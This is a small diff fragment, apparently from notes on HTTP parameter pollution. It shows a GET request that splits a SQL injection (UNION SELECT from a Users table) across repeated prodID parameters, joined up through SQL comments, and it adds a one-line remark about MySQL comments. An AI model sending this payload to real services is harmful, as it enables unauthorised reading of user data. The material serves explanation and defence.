@@ -10,3 +10,5 @@ In those languages that append polluted parameters into a list (like Python), it
 ```
 GET /api/products?prodID=9 /*&prodID=*/UNION /*&prodID=*/SELECT 1 &prodID=2 &prodID=3 FROM /*&prodID=*/Users /*&prodID=*/ WHERE id=3 --
 ```
+
++ MySQL query execution in comments
